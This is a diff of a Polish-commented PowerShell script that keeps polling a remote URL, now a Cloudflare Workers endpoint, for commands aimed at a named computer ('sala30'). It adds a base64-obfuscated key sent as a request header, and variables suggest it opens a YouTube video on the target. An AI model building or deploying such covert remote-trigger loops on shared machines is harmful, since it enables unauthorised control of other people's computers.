@@ -2,7 +2,7 @@ $checkInterval = 3
 $computerName = "sala30"
 $youtubeUrl = "https://www.youtube.com/watch?v=DjDSUqTcrv4"
 $watchTime = 45
-$url = "https://wkrgames.com/guslarz/pr/start.txt"
+$url = "https://update.bckup.workers.dev"
 $scriptPath = $MyInvocation.MyCommand.Path
 $youtubeStarted = $false
 $ctrlWStarted = $false
@@ -428,7 +428,13 @@ Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Skrypt uruchomiony. Monitoruje: $ur
 
 while ($true) {
     try {
-        $content = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5
+        $key = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q0JuX3poU3RMcTVIenBm"))
+
+        $headers = @{
+            "X-Update-Key" = $key
+        }
+        
+        $content = Invoke-WebRequest -Uri $url -Headers $headers -UseBasicParsing -TimeoutSec 5
         $raw = $content.Content.Trim()
 
         # Format pliku: "nazwakomputera,numer" lub samo "numer"
